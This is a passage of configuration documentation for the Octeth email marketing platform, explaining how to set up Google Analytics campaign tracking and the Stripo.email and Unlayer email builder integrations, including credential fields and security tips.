When a subscriber clicks a link, the link will include `utm_medium=email` (or whatever value you set).

::: tip Viewing Campaign Performance in Google Analytics
After configuring this integration, you can view email campaign performance in your Google Analytics dashboard:

1. Log into Google Analytics
2. Navigate to **Acquisition** → **Campaigns** → **All Campaigns**
3. Look for campaigns with your source keyword (e.g., `octeth`)
4. See detailed metrics: sessions, bounce rate, conversions, revenue, etc.

This helps you understand which email campaigns are most effective at driving valuable actions on your website.
:::

::: info Leave Empty to Disable
If you don't use Google Analytics or don't want to track email campaigns, leave both fields empty. Email campaigns will work normally without these parameters.
:::

### Stripo.email

Stripo.email is a professional drag-and-drop email builder that makes creating beautiful, mobile-responsive emails easy—even if you have no design or coding skills. When integrated with Octeth, your users can design stunning emails using Stripo's visual editor with pre-built templates, content blocks, and design tools.

**Why Use Stripo.email?**

- **No coding required** - Build professional emails by dragging and dropping content blocks
- **Mobile-responsive** - Emails automatically adapt to mobile, tablet, and desktop screens
- **Template library** - Access hundreds of pre-designed email templates
- **Brand consistency** - Save custom blocks and templates for reuse
- **Real-time preview** - See exactly how your email looks before sending

::: info Getting Stripo.email Credentials
To use this integration, you need a Stripo.email account and plugin credentials:

1. Sign up at https://stripo.email/
2. Log into your Stripo account
3. Navigate to **Settings** → **Plugins**
4. Create a new plugin
5. Copy the **Plugin ID** and **Secret Key**
6. Optionally, create project-specific API keys for individual users
:::

**Plugin ID**

Your unique Stripo plugin identifier. This looks like a UUID string (e.g., `a1b2c3d4-e5f6-7890-abcd-ef1234567890`).

Paste the Plugin ID exactly as shown in your Stripo account.

**Secret Key**

Your Stripo plugin authentication credential. This is a long string used to securely connect Octeth to your Stripo account.

Keep this credential confidential—anyone with your Secret Key can access your Stripo plugin.

The legacy interface and the new interface both use these credentials. The Secret Key never leaves Octeth: the new interface asks Octeth for an editor token instead of receiving the key.

**API Key**

Optional configuration for multi-user environments. This field accepts a JSON object that maps individual user IDs to their specific Stripo project API keys.

Example format:
```json
{
  "123": "project-api-key-for-user-123",
  "456": "project-api-key-for-user-456"
}
```

This allows different users to use their own Stripo projects and templates while sharing the same Octeth installation.

::: tip When to Use API Key Mapping
The API Key field is optional and only needed if:
- You have multiple users on your Octeth installation
- Each user should have their own isolated Stripo workspace
- You want to separate templates and designs between users

For simple installations or single-user environments, you can leave this field empty.
:::

**Disabling Stripo.email Integration**

To disable Stripo.email, click **Disconnect Stripo** on the staff **Settings > Integrations** screen and confirm. It clears the Plugin ID and Secret Key, and the Stripo email builder option no longer appears to users. The per-user API keys stay. The stored Secret Key and API keys are write-only there: a blank field keeps the stored value, and a filled API key list replaces the whole list.

### Unlayer

Unlayer is an alternative drag-and-drop email builder similar to Stripo.email. It provides a visual email design tool with templates, customization options, and mobile-responsive design capabilities.

**Why Use Unlayer?**

- **Visual email builder** - Create emails by dragging and dropping content blocks
- **Template library** - Start with professionally designed templates
- **Mobile optimization** - Emails automatically adapt to different screen sizes
- **Custom branding** - Customize the editor interface with your own branding

::: info Getting Unlayer Credentials
To use this integration, you need an Unlayer account:

1. Sign up at https://unlayer.com/
2. Log into your Unlayer account
3. Navigate to **Projects** in your dashboard
4. Create a new project or select an existing one
5. Copy the **Project ID** and **API Key** from your project settings
:::

**Project ID**

Your Unlayer project identifier. This is a numeric or alphanumeric string that identifies your Unlayer project.

**API Key**

Your Unlayer project API credential. This authenticates Octeth's connection to your Unlayer project.

::: warning Stripo vs Unlayer
You can enable both Stripo.email and Unlayer integrations simultaneously. Your users will be able to choose which email builder they prefer when creating campaigns.

However, for simpler user experience, most installations enable only one email builder to avoid confusion.
:::

**Disabling Unlayer Integration**

To disable Unlayer, clear both the **Project ID** and **API Key** fields and save. The Unlayer email builder option will no longer appear to users.

### Saving Your Changes

After configuring your integrations:

1. Review all settings to ensure credentials are entered correctly
2. Click the section's save button: **Save Google Analytics settings** or **Save Stripo settings** on the staff screen, **Save Settings** on the classic page for Unlayer
3. Test each integration to verify it's working:
   - **Google Analytics:** Send a test campaign and check if tracking parameters appear in links
   - **Stripo/Unlayer:** Try creating a new email campaign and verify the email builder loads correctly

::: danger Credential Security
Integration credentials (Secret Keys, API Keys) should be treated as sensitive passwords:

- Never share them publicly or commit them to version control
- Use credentials from trusted accounts only
- Rotate credentials periodically for better security
- If a credential is compromised, regenerate it in the third-party service immediately
:::
